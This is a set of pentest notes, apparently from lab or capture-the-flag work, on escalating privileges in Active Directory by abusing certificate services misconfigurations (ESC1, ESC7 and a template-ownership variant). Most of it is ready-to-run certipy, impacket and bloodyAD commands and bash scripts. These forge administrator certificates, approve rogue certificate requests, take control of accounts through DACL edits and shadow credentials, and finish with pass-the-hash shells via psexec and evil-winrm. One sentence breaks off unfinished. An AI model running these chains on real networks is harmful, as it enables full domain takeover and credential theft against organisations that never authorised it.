---
title: AD Privilege Escalation
---

# Active Directory Privilege Escalation

- [Hacktricks CS Domain Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2)
- [Hacktricks Certificates](https://book.hacktricks.xyz/crypto-and-stego/certificates)
- [impacket](https://github.com/fortra/impacket)
- [certipy](https://github.com/ly4k/Certipy)

## Certificate Authority stuff
- [whitepaper on ESC](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

```bash
certipy-ad find -u my_user -p my_password123 -dc-ip 10.10.10.10
```

In the `.txt` file, look for:
```bash
# Template Name                       : ESC1
# Display Name                        : Escee 1
# Certificate Authorities             : COMPANY-CA
# ...
Enabled                             : True
Enrollee Supplies Subject           : True
Enrollment Rights                   : Company.org\Domain Computers
Enrollment Rights                   : Company.org\Domain Users
```

### Enrollment Rights Domain Computers
```bash
python impacket/examples/addcomputer.py company.org/my_user:'my_password123' -dc-ip 10.10.10.10 -computer-name "newcomputer1" -computer-pass 'newpass1'
```
```bash
certipy-ad req -username 'newcomputer1$' -password 'newpass1' -ca 'COMPANY-CA' -target 10.10.10.10 -template 'ESC1' -upn "administrator@company.org" -dns dns.company.org
```
```bash
certipy-ad auth -pfx administrator_company.pfx -dc-ip 10.10.10.10 -ldap-shell
```

## Vulnerable Certificate Authority Access Control - ESC7
- [Hacktricks ESC7](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7)
```bash
#!/bin/bash

theca='xxxx-DC01-CA'
theuser='xxx@xxx.com'
theusername='xxxxx'
theadmin='administrator@xxx.com'
thepassword='xxxxxxxxx'
theip='x.x.x.x' 
thetarget='xxx.com'

certipy-ad ca -ca $theca -add-officer $theusername -username $theuser -password $thepassword -dc-ip $theip
certipy-ad ca -ca $theca -enable-template SubCA -username $theuser -password $thepassword -dc-ip $theip

REQUEST_ID=$(echo "y" | certipy-ad req -username $theuser -password $thepassword -ca $theca -target $thetarget -template SubCA -upn $theadmin -dc-ip $theip | awk -F' ' '/Request ID is/ {print $5}')
echo "Request ID: $REQUEST_ID"

certipy-ad ca -ca $theca -issue-request $REQUEST_ID -username $theuser -password $thepassword -dc-ip $theip
certipy-ad req -username $theuser -password $thepassword -ca $theca -target $thetarget -retrieve $REQUEST_ID -dc-ip $theip

certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain $thetarget -dc-ip $theip
```

```bash
# this returns a hash
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain $thetargetdomain -dc-ip $theip

# use the hash here
python psexec.py -hashes hhhhhhhh:hhhhhhhhh administrator@xxxx.com
```

## Another ESC like exploit

We found a certificate configuration that grants one of our users 

```bash
certipy-ad find -dc-ip $the_ip -target $the_dc -enabled -username $the_user -p $the_password
```

```bash
#!/bin/bash

export the_ip=10.129.2.81
export the_dc='DC01.xxx.yyy'
export the_ca='xxx-DC01-CA'
export the_domain='xxx.yyy'
export the_user='user-that-i-have-access-to'
export the_password='the-password-of-that-user'
export the_ca_user='the-user-which-has-full-rights-on-the-template'
export the_admin='administrator'
export the_admin_at='administrator@xxx.yyy'
export KRB5CCNAME="$PWD/$the_ca_user.ccache"
export the_vulnerable_template='the-vulnerable-template'

# Give Full Control over to the less permissioned user
bloodyAD --host $the_dc -d $the_domain -u $the_user -p $the_password set owner $the_ca_user $the_user
impacket-dacledit -action 'write' -rights 'FullControl' -principal $the_user -target $the_ca_user "$the_domain/$the_user:$the_password"

# Authenticate 
hash1=$(certipy-ad shadow auto -u "$the_user@$the_domain" -p $the_password -dc-ip $the_ip -target $the_dc -account $the_ca_user | awk '/NT hash for / {print $NF}' | tail -n 1)
certipy-ad template -k -template $the_vulnerable_template -target $the_dc -dc-ip $the_ip
certipy-ad req -u $the_ca_user -hashes $hash1 -ca $the_ca -target $the_dc -dc-ip $the_ip -template $the_vulnerable_template -upn $the_admin_at
certipy-ad auth -pfx "./$the_admin.pfx" -dc-ip $the_ip 

# evil-winrm -i $the_dc -u administrator -H <hash-from-last-step> 
```